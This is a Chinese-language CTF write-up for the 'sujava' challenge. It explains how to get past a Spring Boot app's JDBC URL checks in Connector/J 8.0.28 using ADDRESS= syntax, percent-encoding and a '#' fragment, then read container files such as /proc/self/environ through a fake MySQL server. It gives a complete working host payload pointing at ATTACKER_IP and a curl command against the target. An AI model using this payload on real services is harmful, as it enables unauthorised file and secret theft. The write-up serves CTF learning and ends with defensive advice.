# sujava

## 题目简述

题目提供一个 Spring Boot JDBC 测试接口，运行环境使用 JDK 8 和 `mysql-connector-java-8.0.28`。`POST /jdbc` 接收 `host`、`port`、`database`、`extraParams`、`username`、`password`，经过自定义安全检查后拼接 JDBC URL，并调用：

```java
DriverManager.getConnection(url);
```

决定性漏洞不在 SQL 语句，而在应用校验器与 Connector/J URL 解析器对同一字符串的解释不同。攻击者可以把 Connector/J 的 `ADDRESS=(key=value)...` 属性列表塞进 `host`，再用百分号编码和 `#` 片段绕过黑名单及程序强制追加的安全参数，使服务连接攻击者控制的伪 MySQL 服务端并回传本地文件。

附件中的 `SecurityChecker.class` 还做了刻意混淆：一个字段名被构造成了近似 Java 源码的长字符串，看上去像是严格检查了主机、数据库名、危险参数和 `%`。但 JVM 的方法表中另有真正的 `checkJdbcConnParams()`，实际执行的是明显更弱的字节码。不能把反编译器首先展示的“源码形状”误认为真实控制流。

## 解题过程

### 1. 还原 `/jdbc` 的真实处理流程

对环境 JAR 中的 `CtfController.class` 和 `SecurityChecker.class` 查看字节码，可以还原出：

```java
Map<String, Object> params = jsonToMap(extraParams);

SecurityChecker.checkJdbcConnParams(
    host,
    port,
    username,
    password,
    database,
    params
);

String url = String.format(
    "jdbc:mysql://%s:%s/%s",
    host.trim(),
    port,
    database.trim()
);

SecurityChecker.appendMysqlForceParams(params);

String query = params.entrySet()
    .stream()
    .map(e -> e.getKey() + "=" + e.getValue())
    .collect(Collectors.joining("&"));

DriverManager.getConnection(url + "?" + query);
```

值得注意的是，表单中的 `username` 和 `password` 只传给了检查函数，最终 `DriverManager.getConnection()` 没有接收这两个参数。真正用于 MySQL 握手的用户名，可以由注入到 JDBC URL 中的 `user` 属性决定。

### 2. 识别附件中的伪源码混淆

附件类的常量池里存在一个异常长的字段名。其内容从：

```text
checklist = "allowLoadLocalInfile,...";
public static void checkJdbcConnParams(...)
```

一直延伸到一段看似完整的严格校验代码。由于 JVM 类文件中的成员名不必符合 Java 源码标识符的常规限制，反编译器会把它渲染得像真实方法。

检查 class 文件结构可见：

```text
fields: 10
methods: 13
```

这段“严格方法”实际属于一个 `String` 字段的名称；真正的方法需要以方法表和 `Code` 属性中的指令为准。真实安全检查只做了以下工作：

1. `host` 和 `database` 不能为空；
2. `host` 不能以 `(` 开头，也不能以 `)` 结尾；
3. 拼出的基础 URL 要匹配一个宽松正则；
4. 仅对 `extraParams` 做一次 URL 解码和危险词检查；
5. 在未解码的基础 URL 中搜索几个危险属性名；
6. 检查结束后，向查询参数追加若干 `false`。

其中 URL 正则的主机部分是：

```regex
[^:]+
```

它不仅接受域名和 IP，也接受括号、等号、百分号编码及 `#`，为 URL 解析差异留下了空间。

### 3. 分析三层绕过

第一层是 `ADDRESS` 主机语法。Connector/J 8.0.28 可以把：

```text
ADDRESS=(host=...)(port=...)(user=...)(property=value)
```

解析成一组连接属性。载荷以 `ADDRESS=` 开头，最后再附加其它字符，因此既不以 `(` 开头，也不以 `)` 结尾。

第二层是百分号编码。`checkUrlIsSafe()` 只在尚未解码的 URL 中搜索：

```text
autoDeserialize
allowLoadLocalInfile
allowUrlInLocalInfile
allowLoadLocalInfileInPath
```

将属性名逐字节编码为 `%61%6c...` 后，应用黑名单看不到明文；Connector/J 后续解析 `ADDRESS` 时却会恢复真实属性名。

这里有一个容易忽略的 HTTP 传输细节：如果使用
`application/x-www-form-urlencoded`，Spring 会先解码一次 `%61`，黑名单仍能看到明文。可以使用 `multipart/form-data` 并让字段中保留字面量 `%61`，或者在 URL 编码表单中把 `%` 再编码成 `%25`。

第三层是 `#`。应用最终强制追加：

```text
?allowLoadLocalInfile=false
&autoDeserialize=false
&allowLocalInfile=false
&allowUrlInLocalInfile=false
```

但在注入的地址属性后放置：

```text
#/test
```

会让 Connector/J 把程序随后补上的 `:3306/test?...` 当作片段内容，不再覆盖前面注入的属性。

### 4. 构造可被 Connector/J 重新解释的 `host`

先在攻击者可被题目容器访问的地址启动伪 MySQL 服务，监听 3306 端口。下面的 `ATTACKER_IP` 必须替换为实际可达地址：

```text
ADDRESS=(host=ATTACKER_IP)(port=3306)(database=test)(user=fileread_file%3A%2F%2F%2F.)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65%49%6e%50%61%74%68=%2F)(%61%6c%6c%6f%77%55%72%6c%49%6e%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%6d%61%78%41%6c%6c%6f%77%65%64%50%61%63%6b%65%74=655360)  #/test
```

其余表单字段为：

```text
port=3306
database=test
extraParams={}
username=test
password=root
```

例如使用 `curl --form-string` 发送 multipart 字段，可以避免客户端把 `%` 或以 `@` 开头的内容再次解释：

```bash
curl -sS -X POST 'http://TARGET/jdbc' \
  --form-string 'host=<上面的完整 ADDRESS 载荷>' \
  --form-string 'port=3306' \
  --form-string 'database=test' \
  --form-string 'extraParams={}' \
  --form-string 'username=test' \
  --form-string 'password=root'
```

用题目自带的 Connector/J 8.0.28 解析最终 URL，可以得到：

```text
host=ATTACKER_IP
port=3306
database=test
user=fileread_file:///.
allowLoadLocalInfile=true
allowLoadLocalInfileInPath=/
allowUrlInLocalInfile=true
maxAllowedPacket=655360
```

而应用追加的四个 `false` 均未进入连接属性。这证明绕过点不是大小写覆盖，而是应用与驱动对 URL 边界的解释不一致。

### 5. 通过伪 MySQL 服务读取文件

[MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server) 提供了本题所需的最小协议实现。它完成握手后读取客户端用户名；当用户名以 `fileread_` 开头时，服务端把后缀作为文件名发送 `LOCAL_INFILE` 请求，再接收并保存客户端返回的字节。因此正文中的：

```text
user=fileread_file:///.
```

会让伪服务端请求 `file:///.`。这里保留项目链接是因为它提供了可直接复现的 MySQL 报文实现；其关键行为、用户名约定和数据流已经写入正文，无需依赖外部文章才能理解解法。

仓库的容器布置还埋了一个干扰项：

```dockerfile
ENV FLAG=SUCTF{Y0u_Re41ly_a_JdbC_M4st3r_And_H4v3_A_G0od_d4y!!!}
COPY suctf_fl4g /ctf
```

`/ctf/suctf_fl4g` 的内容只是：

```text
SUCTF{Th1s_1s_a_F4ke_fl4g!!!}
```

因此不能在读到该文件后停止。把载荷中的 `user` 改为：

```text
user=fileread_file%3A%2F%2F%2Fproc%2Fself%2Fenviron
```

伪服务端就会请求：

```text
file:///proc/self/environ
```

Java 进程的环境中包含真正的 `FLAG`。仓库环境给出的静态 flag 为：

```text
SUCTF{Y0u_Re41ly_a_JdbC_M4st3r_And_H4v3_A_G0od_d4y!!!}
```

比赛远程实例若动态注入 flag，应以实际回传的环境变量为准。

## 方法总结

本题同时考察了 class 文件混淆和多层解析差异：

1. 不能相信反编译器渲染出的伪源码，必须核对 class 文件中的字段表、方法表与实际字节码；
2. 应用把 `host` 当普通字符串检查，Connector/J 却把它解释为 `ADDRESS` 属性列表；
3. 应用检查未解码字符串，驱动随后执行百分号解码；
4. 应用在尾部追加安全参数，驱动却因前面的 `#` 将整个尾部视为片段；
5. 最终利用 MySQL `LOCAL_INFILE` 的客户端文件读取语义，把容器内文件传回伪服务端。

防御不能依赖危险词黑名单。更可靠的做法是把主机限制为解析后的 IP 或规范化域名，禁止用户控制完整 JDBC URL，使用固定连接属性对象，并在驱动层永久关闭 `allowLoadLocalInfile` 和 `allowUrlInLocalInfile`。任何校验都应作用于与驱动最终消费完全相同的规范化结构，而不是作用于尚未解析的原始字符串。
